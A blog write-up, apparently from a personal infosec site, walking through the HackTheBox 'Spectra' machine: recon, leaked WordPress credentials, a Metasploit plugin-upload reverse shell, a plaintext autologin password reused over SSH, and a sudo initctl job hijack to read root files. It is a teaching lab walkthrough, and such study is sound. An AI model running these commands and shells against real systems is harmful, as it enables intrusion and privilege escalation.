@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Spectra - HackTheBox Write-up :: The Red Bay</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Intro Hello all, here&amp;rsquo;s an other one for your entertainment purposes! Today, we will be looking at spectra &amp;ndash; A bit late since this box was solved back in May of 2021 but I didn&amp;rsquo;t get to the walkthrough part until now.
+The information card states that this is an easy machine and was released at the beginning of the year. One difference from others that we&amp;rsquo;ve looked at up until now is that the OS states Other." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theredbay.net/infosec/htb/htb-spectra/" />
+
+
+
+
+<link rel="stylesheet" href="https://theredbay.net/assets/style.css">
+
+  <link rel="stylesheet" href="https://theredbay.net/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theredbay.net/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theredbay.net/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="redbay" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Spectra - HackTheBox Write-up">
+<meta property="og:description" content="Write-up for the &#39;Spectra&#39; box from HackTheBox.eu" />
+<meta property="og:url" content="https://theredbay.net/infosec/htb/htb-spectra/" />
+<meta property="og:site_name" content="The Red Bay" />
+
+  
+    <meta property="og:image" content="https://theredbay.net/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-09-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    The Red Bay
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Menu ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/about">About</a></li>
+              
+            
+              
+                <li><a href="http://github.com/rebay1982">GitHub</a></li>
+              
+            
+              
+                <li><a href="/infosec">Infosec</a></li>
+              
+            
+              
+                <li><a href="/misc">Misc</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="http://github.com/rebay1982">GitHub</a></li>
+      
+    
+      
+        <li><a href="/infosec">Infosec</a></li>
+      
+    
+      
+        <li><a href="/misc">Misc</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theredbay.net/infosec/htb/htb-spectra/">Spectra - HackTheBox Write-up</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-09-01 
+      </span>
+    
+    
+    <span class="post-author">:: redbay</span>
+    
+  </div>
+
+  
+
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#tldr">TL;DR</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Hello all, here&rsquo;s an other one for your entertainment purposes! Today, we will be looking at
+<code>spectra</code> &ndash; A bit late since this box was solved back in May of 2021 but I didn&rsquo;t get to the
+walkthrough part until now.</p>
+<p><img src="/img/htb-spectra/infocard.png" alt=""></p>
+<p>The information card states that this is an easy machine and was released at the beginning of the
+year. One difference from others that we&rsquo;ve looked at up until now is that the OS states <strong>Other</strong>.
+This just means that it&rsquo;s not necessarily a Linux box so we&rsquo;ll keep that in mind while we look
+around. To break this box, we will also be going over a couple of new tools. We will be looking at
+<a href="https://github.com/OJ/gobuster">Gobuster</a> and <a href="https://www.metasploit.com">Metasploit</a> so do take
+the time to either install <a href="https://www.kali.org/">Kali Linux</a> and have the tools ready to go or
+install them on your machine before proceeding &ndash; installing and configuring them is out of scope
+for this article.</p>
+<p>And, as usual, if time is your #1 priority, skip to the <a href="#tldr">TL;DR</a> section at the end for the
+step by step solution.</p>
+<p>Without further do, let&rsquo;s dig in!</p>
+<h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Before we start, let&rsquo;s pop <code>10.10.10.229</code> as the <code>spectra.htb</code> entry in our hosts file and get an
+<code>nmap</code> scan going.</p>
+<pre><code>$ nmap -A -T4 -p- spectra.htb
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 14:38 EDT
+Nmap scan report for spectra.htb (10.10.10.229)
+Host is up (0.030s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey:
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http    nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.92 seconds
+</code></pre><p>Wondering what the parameters of the <code>nmap</code> command mean?
+<a href="https://svn.nmap.org/nmap/docs/nmap.usage.txt">Documentation</a> is our friend here. How else can we
+expecting to learn anything? :)</p>
+<p>Alright, we have ports <code>22</code>, <code>80</code>, and <code>3306</code> open &ndash; that&rsquo;s SSH, HTTP, and MySQL, respectively.
+Let&rsquo;s start by investigating the HTTP server.</p>
+<h3 id="surfs-up">Surf&rsquo;s Up<a href="#surfs-up" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>First and foremost, let&rsquo;s go pull out our ultra specialized hacking tool: our web browser. We need
+to figure out what the HTTP server is serving up. In this case the web server is
+<a href="https://www.nginx.com/"><code>nginx</code></a> so it could be a proxy, a gateway, or configured as a load
+balancer for multiple servers. We can&rsquo;t really tell from what we gleaned from our <code>nmap</code> scan.</p>
+<p>Navigating to <code>spectra.htb</code> brings up a pretty rudimentary page about IT not having setup Jira yet
+with two links in it.</p>
+<p><img src="/img/htb-spectra/web-spectra.png" alt=""></p>
+<p>Clicking <code>Software Issue Tracker</code> brings us to a WordPress portal.</p>
+<p><img src="/img/htb-spectra/web-main.png" alt=""></p>
+<p>This hints at why there is a MySQL database running on this box as well. WordPress has features to
+persist comments, users accounts, etc. It needs to store that information somewhere and that
+somewhere is usually a MySQL relational database.</p>
+<p>We can also gather that there is a user called <code>administrator</code> in the system. How? Looking at the
+main page, we see the most recent post &ldquo;By administrator&rdquo;, posted on June 29th 2020. Let&rsquo;s keep
+this in mind as it might be useful for later.</p>
+<p>The next link on the page is <code>Test</code>. If you click it you will be redirected to
+<code>spectra.htb/testing/index.php</code> which complains it can&rsquo;t connect to the database. Interesting. If
+we pull back and point the web browser to <code>spectra.htb/testing/</code> and drop the <code>index.php</code> file, we
+are presented with a directory listing containing a bunch of files that seem very interesting.
+WordPress configuration files for example.</p>
+<p><img src="/img/htb-spectra/web-testing-list.png" alt=""></p>
+<p>Up until now, we haven&rsquo;t made a lot of progress. We found a WordPress portal, we found a &ldquo;testing&rdquo;
+directory and that is about it. We could press on and start &ldquo;guessing&rdquo; URLs and try to point our
+web browser to different endpoints of files on the web server but that&rsquo;s not what we will be doing
+here. There comes a time where tools can greatly accelerate manual operations like this. We call
+them enumeration tools. We will be using <a href="https://github.com/OJ/gobuster">Gobuster</a> so let&rsquo;s get
+familiar with it in the next section.</p>
+<h3 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Gobuster is defined as a web enumeration tool. It needs two things, obviously a target and a
+file containing a list of endpoints to test, AKA a wordlist. Wordlists are text files that contain
+a list of endpoints &ndash; the concept is similar to a worldlist used for password cracking. Common
+wordlists can be found <a href="https://github.com/daviddias/node-dirbuster/tree/master/lists">here</a>.
+Longer lists will naturally take more time to go through but will have more thorough results.</p>
+<p>Armed with a target and a wordlist, let&rsquo;s give Gobuster a spin.</p>
+<pre><code>$ gobuster -u http://spectra.htb/ -w ../../tools/http-enum/common.txt
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://spectra.htb/
+[+] Threads      : 10
+[+] Wordlist     : ../../tools/http-enum/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2021/05/08 14:52:54 Starting gobuster
+=====================================================
+/index.html (Status: 200)
+/main (Status: 301)
+/testing (Status: 301)
+=====================================================
+2021/05/08 14:53:10 Finished
+=====================================================
+</code></pre><p>A few notes on interpreting the results. <code>Status codes</code> are the HTTP response codes for which
+Gobuster will consider a hit. The tool also displays which status code was received from the
+server for each hit in the results list.</p>
+<p>Notice that an older version of Gobuster was used for this scan. There is no good reason for this
+and using a more rescent version of the tool will yield the same results.</p>
+<p>The results list didn&rsquo;t reveal anything new that we weren&rsquo;t already aware of. <code>/index.html</code> is the
+minimal page with the two links we observed at the very beginning of our web surfing effort. <code>/main</code>
+is the WordPress portal, and we also already listed the <code>/testing</code> directory.</p>
+<p>This was not wasted effort because we made sure we&rsquo;re not missing out on something. We also removed
+most of the guesswork around the HTTP discovery. We are going to dig further in the <code>/testing</code>
+directory because it seems to contain some PHP source files and some configuration files for
+WordPress.</p>
+<h2 id="user">User<a href="#user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As stated previously, we noticed some interesting files while looking around in the <code>/testing</code>
+directory. We can start by taking a look at some configuration files. Why configuration files? They
+often contain credentials to databases, or to third party systems the WordPress website might use or
+depend on. <code>wp-config.php.save</code> looks promissing. The <code>.save</code> suffix hint sat a backup of some sorts
+and it&rsquo;s also newer than other files in the listing.</p>
+<p>If you simply click on the <code>wb-config.php.save</code>, you will be presented a blank page. Why? There is
+no renderable HTML in it &ndash; this is where we can use the &ldquo;View Source&rdquo; feature of a web browser to
+check out the contents of the file. We&rsquo;re expecting some PHP code since it&rsquo;s a PHP file. Let&rsquo;s have
+a look.</p>
+<p><img src="/img/htb-spectra/enum-wp-config-php-save.png" alt=""></p>
+<p>Bingo, it indeed contains PHP code and along with the code, we have found credentials to the
+database.</p>
+<pre><code>// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'dev' );
+
+/** MySQL database username */
+define( 'DB_USER', 'devtest' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'devteam01' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+</code></pre><p>Let&rsquo;s try to log into WordPress with these credentials. From the portal, we can go ahead and find
+the login panel and attempt a login.</p>
+<p><img src="/img/htb-spectra/user-login-devtest-fail.png" alt=""></p>
+<p>So, the <code>devtest/devteam01</code> username and password pair doesn&rsquo;t work. Time to try something else. We
+do remember that there is an <code>administrator</code> user on this portal because they posted the <code>Hello  World</code> post from what we gathered in the <a href="#surfs-up">Surf&rsquo;s Up</a> section. Let&rsquo;s go ahead and try
+<code>administrator</code> as the user name and keep the <code>devteam01</code> as the password.</p>
+<p><img src="/img/htb-spectra/user-login-administrator.png" alt=""></p>
+<p>BOOM! Alright, we don&rsquo;t have the user flag yet but we&rsquo;re making good progress. Let&rsquo;s recoup and look
+back at how far we&rsquo;ve come. We have gained access to the Administrator portal by finding credentials
+left in a configuration file in the <code>/testing</code> directory. The credentials didn&rsquo;t actually work but
+we did infer that there should be an <code>administrator</code> user from the fact that they have left a &ldquo;Hello
+World!&rdquo; post on the main page.</p>
+<p>I often mention this in my write-ups. Up until now we haven&rsquo;t been doing any &ldquo;hacking&rdquo; or anything
+that reqquires advanced technical skills. We&rsquo;re just looking around and whoever setup this site left
+sensitive information laying around. As a best practice, directories containing credentials or
+configuration files shouldn&rsquo;t be made accessible to the outside world. These things should always be
+locked down and their contents validated for any potentially sensitive information.</p>
+<h3 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Alright, let&rsquo;s move on. We now have a target system and version &ndash; WordPress 5.4.2 in our case.
+Armed with this information, let&rsquo;s go scour the Internet to find a potential vulnerability. The
+objective of all this is to obtain some form of shell on the machine. More specifically, we&rsquo;re
+looking into getting a reverse shell from the <code>spectra</code> machine. Reverse Shells are out of scope for
+this write-up but this
+<a href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">article</a> explains the
+concept pretty well.</p>
+<p>Building up on the reverse shell concept and objective, WordPress has a plugin system that allows
+you to create custom PHP plugins to add functionality to the site. The documentation can be found
+<a href="https://developer.wordpress.org/plugins/intro/">here</a> for those wanting to understand how plugins
+work and how they need to be developed. At this point, a light bulb just went off in our heads: Can
+we create, upload and install a malicious WordPress plugin containing a PHP reverse shell?</p>
+<p>This is a valid hypothesis and there are two approaches to it.</p>
+<ol>
+<li>Find or write a PHP reverse shell and package it in a WordPress plugin, all from scratch.</li>
+<li>Find an existing exploit that does the leg work for us.</li>
+</ol>
+<p>For brievity&rsquo;s sake, we&rsquo;ll go for option 2 in this article. Building our own exploit is out of scope
+for a write-up and could be an article on its own. We can still find some
+<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell code</a>
+on Github and build it from there &ndash; this will be left as an exercice for the reader.</p>
+<p>Moving on, there is a Metasploit module that does exactly this &ndash; abuse the WordPress plugin system
+to obtain a reverse shell through PHP given a set of administrator credentials.
+<a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/">Details</a> of this
+exploit can be found on the Rapid7 website &ndash; the maintainers of Metasploit.</p>
+<p>This is also the first time we discuss <a href="https://www.metasploit.com">Metasploit</a> so let&rsquo;s take a few
+moments to go over what it is and why use it. It is a modular framework built with the penetration
+tester in mind. It enables someone to use readily available modules that exploit a specific
+vulnerability in a system or software &ndash; see it as a tool to verify and validate if a system
+contains vulnerabilities that are readily exploitable. That being said, it can also be used to
+quickly achieve things like remote code execution (what we will do in a few moments) and that is OK.
+Although Metasploit can be used as a time saving tool or to shortcut to a specific goal, we should
+be motivated to use it after having a good grasp on how and why an exploit works. This is immensely
+more fulfilling than blindly using a tool to work out the &ldquo;magic&rdquo; parts. Let&rsquo;s not forget that we
+are mainly here to learn.</p>
+<p>Without further due, let&rsquo;s fire up Metasploit. We will be using the
+<code>exploit/unix/webapp/wp_admin_shell_upload</code> so let&rsquo;s see how to set it up and get it ready for
+exploitation.</p>
+<pre><code>       =[ metasploit v6.0.37-dev                          ]
++ -- --=[ 2111 exploits - 1136 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: When in a module, use back to go
+back to the top level prompt
+
+msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+</code></pre><p>As simple as that, all we have to do is launch Metasploit with <code>msfconsole</code> and type in <code>use</code>
+followed by the the module we want to load. The <code>options</code> command, when a module is selected, will
+display the configurable options as shown bellow.</p>
+<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME                    yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.0.175       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt;
+</code></pre><p>We have a few things to go over. Now, from the description, this module will generate a plugin,
+embed a PHP reverse shell payload in it, and upload it to a running WordPress server using
+the provided administrator account username and password.</p>
+<p>You can see the required fields from the listing above with their description on what a specific
+parameter does. Let&rsquo;s go ahead and configure the module for our specific use case.</p>
+<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD devteam01
+PASSWORD =&gt; devteam01
+msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set RHOSTS 10.10.10.229
+RHOSTS =&gt; 10.10.10.229
+msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set USERNAME administrator
+USERNAME =&gt; administrator
+msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set LHOST &lt;your IP&gt;
+LHOST =&gt; &lt;your IP&gt;
+msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set LPORT 4444
+LPORT =&gt; 4444
+</code></pre><p>Everything is straight forward. The <code>&lt;your IP&gt;</code> field should be replaced with the IP address of the
+attacking host, on the HackTheBox network. <code>LPORT</code> can be any free port on the attacking host, we
+just need to make sure it&rsquo;s not being blocked by any firewall or used by any other running service.
+An other note, <code>TARGETURI</code> was required to set in our case because we are not using the default <code>/</code>
+setting. Our WordPress portal is at <code>http://spectra.htb/main</code>, <strong>NOT</strong> <code>http://spectra.htb/</code>. Not
+setting this will result in the exploit failing:</p>
+<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.85:4444
+[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
+[*] Exploit completed, but no session was created.
+</code></pre><p>Setting the <code>TARGETURI</code> to <code>/main</code>, as stated above, will fix target WordPress and drop us in a
+<a href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a> shell (see
+it as a shell on steroids).</p>
+<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /main
+TARGETURI =&gt; /main
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.85:4444
+[*] Authenticating with WordPress using administrator:devteam01...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /main/wp-content/plugins/gkMsnyYfEf/WrfRAdylzO.php...
+[*] Sending stage (39282 bytes) to 10.10.10.229
+[+] Deleted WrfRAdylzO.php
+[+] Deleted gkMsnyYfEf.php
+[+] Deleted ../gkMsnyYfEf
+[*] Meterpreter session 1 opened (10.10.14.85:4444 -&gt; 10.10.10.229:37020) at 2021-05-08 15:59:58 -0400
+
+meterpreter &gt; shell
+Process 8036 created.
+Channel 0 created.
+sh: 0: getcwd() failed: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+</code></pre><p>Once the Meterpreter session is open, we can use the <code>shell</code> command to drop to an <code>sh</code> shell. It is
+pretty limited (no echo, no prompt) so we can upgrade it to an interactive shell using the following
+python command</p>
+<pre><code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+</code></pre><p>The <code>pty</code> package stands for &ldquo;Pseudo-Terminal Utilities&rdquo; and <code>spawn</code> simply spawns a new process,
+<code>/bin/bash</code> in our case. The full documentation is available
+<a href="https://docs.python.org/3/library/pty.html#pty.spawn">here</a>.</p>
+<p>We now have a shell as the <code>nginx</code> user &ndash; this won&rsquo;t get us very far but we now have a foothold on
+the box. To recap real quick, we used Metasploit to abuse a vulnerability in WordPress where we can
+upload a malicious plugin and use it to obtain a reverse shell on the target machine. We could have
+built our own exploit for kicks (and an interesting challenge that would be) but for brievity&rsquo;s sake
+we opted on exploring and using Metasploit. We got a minimal shell, then moved on to make it
+interactive with a small Python program. Our next steps are enumeration with an objective
+of privilege escalation, and going after the &ldquo;user&rdquo; account and get that user flag.</p>
+<h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>First things first, let&rsquo;s start by identifying which user we will need to &ldquo;attack&rdquo;. We can do a
+quick scan of the <code>/etc/passwd</code> file. It is world readable and contains information on the users but
+no password hashes. Those can be found in the <code>/etc/shadow</code> file but only <code>root</code> has read access to
+it under normal circumstances.</p>
+<pre><code>nginx@spectra / $ cat /etc/passwd
+messagebus:!:201:201:dbus-daemon:/dev/null:/bin/false
+chunneld:!:20141:20141:Daemon for tunneling localhost to containers:/dev/null:/bin/false
+root:x:0:0:root:/root:/bin/bash
+bin:!:1:1:bin:/bin:/bin/false
+
+...
+
+nsmasq:!:268:268:dnsmasq:/dev/null:/bin/false
+tcpdump:!:215:215:tcpdump --with-user:/dev/null:/bin/false
+nginx:x:20155:20156::/home/nginx:/bin/bash
+katie:x:20156:20157::/home/katie:/bin/bash
+</code></pre><p>There are a lot but the interesting ones are at the bottom. It&rsquo;s obviously not going to be a system
+account. Also, from the list, only <code>katie</code> and <code>nginx</code> have their home directory under <code>/home</code>.
+Since we&rsquo;re already logged in as the <code>nginx</code> user, we can easily come to the conclusion that <code>katie</code>
+is the target.</p>
+<p>Now that we&rsquo;ve identified our target, it&rsquo;s time to either find their password, or find a
+misconfiguration or vulnerability that will allow us to obtain access to their account. There
+isn&rsquo;t much magic to this step either, we need to be curious and just go through the system and dig
+for clues and information.</p>
+<p>If we follow standard enumeration techniques, directories of interest for these kind of things are
+<code>/etc</code>, <code>/opt</code>, <code>/var/log</code>, and <code>/tmp</code>.</p>
+<p>Going through <code>/opt</code> we stumble upon the <code>autologin.conf.orig</code> file. This seems like a configuration
+file that was backed up for some reason. In any case, we can look through its contents.</p>
+<pre><code>nginx@spectra /opt $ cat auto
+cat autologin.conf.orig
+# Copyright 2016 The Chromium OS Authors. All rights reserved.
+# Use of this source code is governed by a BSD-style license that can be
+# found in the LICENSE file.
+description   &quot;Automatic login at boot&quot;
+author        &quot;chromium-os-dev@chromium.org&quot;
+# After boot-complete starts, the login prompt is visible and is accepting
+# input.
+start on started boot-complete
+script
+  passwd=
+  # Read password from file. The file may optionally end with a newline.
+  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
+    if [ -e &quot;${dir}/passwd&quot; ]; then
+      passwd=&quot;$(cat &quot;${dir}/passwd&quot;)&quot;
+      break
+    fi
+  done
+  if [ -z &quot;${passwd}&quot; ]; then
+    exit 0
+  fi
+  # Inject keys into the login prompt.
+  #
+  # For this to work, you must have already created an account on the device.
+  # Otherwise, no login prompt appears at boot and the injected keys do the
+  # wrong thing.
+  /usr/local/sbin/inject-keys.py -s &quot;${passwd}&quot; -k enter
+end script
+</code></pre><p>A Google search for this file also yields the same result &ndash; turns out this is a system file on
+<a href="https://chromium.googlesource.com/chromiumos/overlays/chromiumos-overlay/+/master/chromeos-base/autologin/files/init/autologin.conf">Chrome OS</a>.
+We can now assume that the OS (which is listed as &ldquo;other&rdquo; on the info card) is ChromeOS. A
+Chromebook is running this? Interesting&hellip;</p>
+<p>Anyway, back to the file. It&rsquo;s time for us to read some code &ndash; this seems to be used for an auto
+login feature and you can configure this by providing a password in the <code>/etc/autologin/passwd</code> file
+. Let&rsquo;s see if such a file exists and dump its contents if it does.</p>
+<pre><code>nginx@spectra /opt $ cat /etc/autologin/passwd
+SummerHereWeCome!!
+
+</code></pre><p>Someone&rsquo;s excited for summer! It&rsquo;s hard to confirm if its <code>katie</code>&rsquo;s password or the password of an
+other user since the autologin feature doesn&rsquo;t seem to distinguish users or user names. In any case,
+the only way to find out is to try it out.</p>
+<p>From the <a href="#initial-recon">Initial Recon</a> section, we can recall that port <code>22</code> (SSH) is open. We can
+give this a shot and provide this password for the <code>katie</code> user.</p>
+<pre><code>$ ssh katie@10.10.10.229
+(katie@10.10.10.229) Password: &lt;enter SummerHereWeCome!!&gt;
+
+katie@spectra ~ $ 
+</code></pre><p>Well, what do you know. We were able to login into <code>katie</code>&rsquo;s account using the password we found.</p>
+<p>First things first though. Let&rsquo;s ID the <code>katie</code> user.</p>
+<pre><code>katie@spectra ~ $ id
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+</code></pre><p>She&rsquo;s in the <code>developers</code> group. This might not seem super important now but let&rsquo;s keep this in the
+back of our minds, this extra information can come in handy later if we need it.</p>
+<p>Let&rsquo;s see if we can access the <code>user.txt</code> file and extract the user flag from it.</p>
+<pre><code>katie@spectra ~ $ cat user.txt
+e89d27fe195e9114ffa72ba8913a6130
+</code></pre><p>Alright, awesome we got the user flag! Let&rsquo;s take a breather and recap what just happened here. We
+were able to escalate out of the limited <code>nginx</code> user without much technical proesse. We stumbled
+upon a backed up system file that seems to have been misplaced. Its obvious purpose is to auto-login
+a user. By reading the code, we learned in which file this feature reads the user&rsquo;s password from.
+Passwords, for any kind of feature, shouldn&rsquo;t be stored in plain text on the system &ndash; certainly not
+on world readable files like in this example. This is such a great  example of why this should be
+avoided.</p>
+<p>Next up, moving up the ranks and reaching <code>root</code> access!</p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>When trying to escalate privileges from a normal user to <code>root</code>, we need to find either a flaw in a
+software or service that is running as that privilegeid user, or we need to find a misconfiguration
+in the system that will allow us to execute commands as the privileged user. In the case of
+<code>spectra</code>, we&rsquo;ll be dealing with the latter.</p>
+<p>One of the first steps to get this investigation going is to check the sudoer list. Why <code>sudo</code>? It
+allows users to execute commands with elevated privileges (as <code>root</code>) so if we can find a flaw and
+drop into a shell while running something with elevated privileges, the shell will also have
+elevated privileges. The <a href="https://wiki.archlinux.org/title/sudo">Arch Wiki</a> has an abundance of
+information about how <code>sudo</code> works and how to configure it on a Linux (or similar) system.</p>
+<p>To list the <code>sudo</code> list for our current user, all we have to do is run the <code>sudo -l</code> command and
+look at its output.</p>
+<pre><code>katie@spectra ~ $ sudo -l
+User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl
+</code></pre><p>So it seems that we can execute, with <code>sudo</code>, the <code>/sbin/initctl</code> command. The <code>NOPASSSWD</code> option
+specifies that we do not need to enter the <code>root</code>&rsquo;s password while invoking the command.</p>
+<p>Before we can start thinking of exploiting <code>/sbin/initctl</code>, we need to figure out what it actually
+does if we&rsquo;re not familiar with it. It&rsquo;s a command that allows interactions with the Upstart
+daemon. From the <a href="http://upstart.ubuntu.com/getting-started.html">Ubunto documentation</a> we can
+extract that configured jobs are, by default, installed in <code>/etc/init</code> directory. We can list them
+with <code>sudo initctl list</code> and we can run them with <code>sudo /sbin/initctl start &lt;job name&gt;</code>.</p>
+<p>Let&rsquo;s list what jobs are currently running.</p>
+<pre><code>katie@spectra ~ $ sudo /sbin/initctl list
+crash-reporter-early-init stop/waiting
+cups-clear-state stop/waiting
+...
+...
+udev start/running, process 235
+test stop/waiting
+test1 stop/waiting 
+</code></pre><p><code>test</code> and <code>test1</code> strike us as interesting because they are not part of the jobs/scripts that we
+would normally encounter on a default configuration. Someone has been running tests ;)</p>
+<p>Since these jobs can be invoked using <code>sudo</code>, modifying the script found in <code>/etc/init/test.conf</code>
+will allow us to run pretty much any command we desire as the <code>root</code> user. First, we need to make
+sure we can actually modify or write to a job configuration file.</p>
+<p>We will be looking at two types of solutions here. One that will simply retrieve the root flag and a
+second one that will setup some form of access persistence. In our use case, we&rsquo;re after the root
+flag so the first solution is enough. In a real world penetration test, we would prefer the
+persistence solution so that we could easily regain root privileges to the machine without going
+through all the steps listed above. This is how threat actors operate too.</p>
+<h3 id="flag-solution">Flag Solution<a href="#flag-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We know that the flag we&rsquo;re after is inside the file <code>/root/root.txt</code>. Our script, when invoked
+through <code>sudo /sbin/initctl</code>, is running with root privileges. It will have the required access to
+read the <code>root.txt</code> file, something our <code>katie</code> user doesn&rsquo;t have.</p>
+<p>Here is what we&rsquo;ll be replacing the script in <code>test.conf</code> with:</p>
+<pre><code>   cat /root/root.txt &gt;&gt; /home/katie/flag.txt
+   chmod 777 /home/katie/flag.txt
